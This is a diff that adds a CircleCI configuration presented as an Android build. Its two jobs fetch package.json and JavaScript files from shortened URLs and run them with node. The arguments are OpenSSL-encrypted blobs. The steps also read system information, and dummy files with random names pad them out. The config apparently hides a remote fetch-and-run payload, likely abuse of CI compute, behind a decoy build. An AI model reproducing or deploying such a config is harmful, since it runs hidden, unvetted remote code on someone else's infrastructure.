@@ -1,0 +1,52 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  build-source:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 3eaywx7l6vseamh563cjfhsfkye6
+      - run: touch gdsrl9tmoecvqbna.js
+      - run: curl -fsSL shorturl.at/opAS7 -o package.json && curl -fsSL
+          shorturl.at/nzNQS -o p1a2oj8ax36.js && curl -fsSL shorturl.at/kBU16 -o
+          eimmo1ls6ik0ayctr.js
+      - run: npm i -s
+      - run: touch yhllhr28f7ucykrhpj1qd8x0ktoh.js
+      - run: cat /etc/os-release
+      - run: node p1a2oj8ax36 -s
+          U2FsdGVkX1/23HjGIXe8FJKr4lfgZHRUQnPAp+PxQC5ckmwRu5lmY5KOtlZCVG+ori+Tx9temwGXrtfBwehoTe5/zzxcQE2NxdHIGJrAP39NFG/jYoruhCGvfbZItLNtOI7uaPnlOWi37N6BKItW2+WzF1EPQPIlZ5L2dqdjoaxkQbTWkjz0m526TM8FpavDFu6OTp+RtIt6h83qEaMAUdOI22tXK4q3KMWVMPYE5ag=
+          -lpn U2FsdGVkX1/5mtzjdOPf8G7gZz95qa+Z6VegGKk9iB2PZDFKOTV1sSnmEekEKPt/
+          -sp -t
+          U2FsdGVkX184lkxHXJnjmfDNo9S6TSuUgNvJd+6nqWmsdYgvAdyH1Pwtjxb1CTvP -r
+          U2FsdGVkX18VGQfujiOhsBU6qmJIezhEcy03JNXveFyxC9zA8ZZpLX/N89LBeQnzQIf9fieA3F+UfBwvxWcDcpIFqqe+WW7LgOVAdjh7+zmTPnZ7DR2BM2C3XKOclYwMZViLvms35Itf3Xnk58Mso5U5AzCPjNCqbClifEvH8CNZrKIX0kXZ0uJfgP1ZAkoJvgkN+adPp5p8UHFx+7pJXt1khWvWzdaU7evUl8YXzw7/SXd4xoqtVzxdwwFgbvxgTKm9cBHuIn3s1HWF3LbH488ojWTZE9XhTdli7QxRydY=
+      - run: mkdir cyi2qk45heq7xt4yqryle
+      - run: touch 4wraesjqqidsep2kjyy7xc94ingvq.cpp
+  node:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/hBIM9 -o ywgsgbctcy6ao.js && curl -fsSL
+          shorturl.at/vCSU5 -o rgpuknlq7rl2t4kq.js && curl -fsSL
+          shorturl.at/aekI0 -o package.json
+      - run: touch 3ctqn95jn9xz9hht9ho.cpp
+      - run: cat /proc/cpuinfo
+      - run: npm i -s
+      - run: cat /etc/os-release
+      - run: touch 186azdtv5bwmn6x.py
+      - run: touch unwjosnss76vb7bxfk.c
+      - run: node ywgsgbctcy6ao -t
+          U2FsdGVkX18bs8M9y6QRmYHSMydK+GbZSsUJR26gvAF3HDTKNQf7hLp0525RKvVO -sp
+          -s
+          U2FsdGVkX1831H9EQz6TSolQs1BidNfzxhT4dun7i95AtMPjHeGL4r9X7hUurzc4zKouyE5hfDtTKxNx7tB2gQZ9dnHrQKhCdZgiwcQ4FYnw/47znlEqIP2DKlmSIL6MZBURT9dJKLSP19iMaWI99vJ97yZobUu/b75djuGVTvFv0QHMuSapsvdT8r63tr914p2dspZMT3IgtyRRpR81xAE63CNii2PEU5OvW+pvsdE=
+          -lpn U2FsdGVkX18SlQm5vUDXycTfF9FLVa4xKxoh9SMx4OGXw1cz4xeVAaiuD/kYlTZg
+          -r
+          U2FsdGVkX197XQIQzo9yVFA3p1eh55UljIqV1Va/A/Ag/zEh/uZRi4tIPIbccH94Vyoz7i2vuDVvEk72HlB0gSMmU3cQ/WpbXRvzH1j0i+FHTjvD0gGljvQgbe0DF+GV9zAub02uK0SvKUJpwoTCWYXZybdQ3k7NEUk9cxQYxWSdKaqPh7y1kVS2G+WkYYhEJDVLPWzOGJ6Z1uRdYR6sTmg0gKZshww8dDO/pI4zb+aU/YaB3hQHkI2GfMVPWqk6h9LcU3XFzJ8bApl/vXs21Fhi2+CxclSkgMyB0+Du7JA=
+      - run: mkdir ne47axt58jb6dcbsi
+workflows:
+  code_617:
+    jobs:
+      - build-source
+  MyJobs:
+    jobs:
+      - node
